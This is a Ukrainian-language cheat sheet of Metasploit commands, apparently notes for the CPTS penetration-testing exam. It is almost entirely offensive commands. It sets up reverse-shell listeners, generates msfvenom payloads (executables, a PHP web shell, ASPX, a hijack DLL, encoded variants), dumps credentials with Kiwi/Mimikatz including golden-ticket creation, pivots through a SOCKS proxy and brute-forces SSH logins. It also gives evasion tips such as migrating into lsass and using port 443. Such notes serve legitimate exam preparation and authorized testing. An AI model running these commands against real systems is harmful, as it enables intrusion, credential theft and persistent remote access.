# Metasploit Framework

> **CPTS exam:** MSF дозволений, але перевір актуальні правила перед іспитом — можливий ліміт на один exploit/один хост. Використовуй MSF для post-exploitation і handler, exploit — вручну коли можливо.

---

## msfconsole — основні команди

```bash
msfconsole -q          # без банера

search <keyword>       # пошук модуля
use <module/path>      # вибрати модуль
info                   # деталі поточного модуля
options                # параметри
show payloads          # сумісні payloads для поточного exploit

set RHOSTS <IP>
set LHOST <IP>
set LPORT 443
set PAYLOAD windows/x64/meterpreter/reverse_tcp

run                    # або exploit
run -j                 # в background як job
jobs                   # список активних jobs
kill <job_id>
```

---

## Multi/Handler (universal listener)

```bash
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp   # або windows/x64/...
set LHOST 0.0.0.0
set LPORT 443
set ExitOnSession false    # не вбивати handler після першої сесії
run -j
```

---

## Сесії та Meterpreter

```bash
sessions -l            # список відкритих сесій
sessions -i <id>       # підключитись до сесії
sessions -k <id>       # вбити сесію
sessions -u <id>       # upgrade shell → meterpreter

background             # повернути сесію у фон (Ctrl+Z теж працює)
```

**Meterpreter корисні команди:**
```
sysinfo                    # OS, hostname, arch
getuid                     # поточний юзер
getpid                     # поточний PID
getsystem                  # спроба PrivEsc (token impersonation / named pipe)
migrate <PID>              # мігрувати в інший процес (стабільність + уникнення детекту)
ps                         # список процесів

upload /local/path /remote/path
download /remote/path /local/path
ls / pwd / cd              # навігація файловою системою
search -f *.txt -d C:\\    # пошук файлів

shell                      # cmd.exe / /bin/sh всередині сесії
execute -f cmd.exe -i -H   # інтерактивний прихований процес

hashdump                   # SAM hashes (потрібен SYSTEM/root)
run post/multi/recon/local_exploit_suggester
```

---

## Kiwi (Mimikatz в Meterpreter)

```
load kiwi
creds_all          # всі знайдені credentials одразу
lsa_dump_sam       # SAM database hashes
lsa_dump_secrets   # LSA secrets (service account passwords)
golden_ticket_create -d <domain> -u <user> -s <SID> -k <krbtgt-hash> -t /tmp/gold.tkt
kerberos_ticket_use /tmp/gold.tkt
```

---

## Post-Exploitation Modules

```bash
# PrivEsc suggester
use post/multi/recon/local_exploit_suggester
set SESSION <id>; run

# Windows hashdump
use post/windows/gather/hashdump
use post/windows/gather/credentials/credential_collector

# Linux
use post/linux/gather/hashdump
use post/linux/gather/enum_system

# Pivoting через MSF route
use post/multi/manage/shell_to_meterpreter
route add <subnet> <netmask> <session_id>   # MSF internal routing
use auxiliary/server/socks_proxy            # SOCKS5 через MSF
set SRVPORT 1080; run -j
# потім: proxychains nmap -sT <target>
```

---

## msfvenom — payload генерація

```bash
# Список payloads:
msfvenom -l payloads | grep "windows/x64"

# Windows reverse shell (exe):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f exe -o shell.exe

# Windows stageless (корисно якщо мережа нестабільна):
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=443 -f exe -o shell.exe

# Linux:
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f elf -o shell.elf

# PHP web shell:
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=443 -f raw -o shell.php

# ASPX:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f aspx -o shell.aspx

# DLL (для DLL hijacking):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f dll -o evil.dll

# Encoder (базова обфускація):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 \
         -e x64/xor_dynamic -i 3 -f exe -o shell_enc.exe

# Перевір архітектуру цілі перед генерацією:
# x64 → windows/x64/... | x86 → windows/...
```

---

## Auxiliary Modules (корисні для CPTS)

```bash
# SMB enum
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb2

# SNMP sweep
use auxiliary/scanner/snmp/snmp_enum

# FTP анонімний
use auxiliary/scanner/ftp/anonymous

# HTTP enum
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/dir_scanner

# SSH login
use auxiliary/scanner/ssh/ssh_login
set USER_FILE /path/users.txt; set PASS_FILE /path/pass.txt

# MSSQL xp_cmdshell
use auxiliary/admin/mssql/mssql_exec
```

---

## Підводні камені

- **Staged vs Stageless:** `windows/x64/meterpreter/reverse_tcp` (staged — `/`) vs `windows/x64/meterpreter_reverse_tcp` (stageless — `_`). Staged потребує активного listener; stageless — ні.
- **migrate після getsystem** — одразу мігруй в `winlogon.exe` або `lsass.exe` для стабільності, інакше процес може впасти.
- **ExitOnSession false** — завжди ставити якщо чекаєш кілька підключень.
- **Port 443** — найменше шансів бути заблокованим файрволом.

**Зв'язки:** [[Shells-Payloads]] · [[Credential-Dumping]] · [[Windows-PrivEsc]] · [[Ligolo-ng]] · [[Bypasses]]
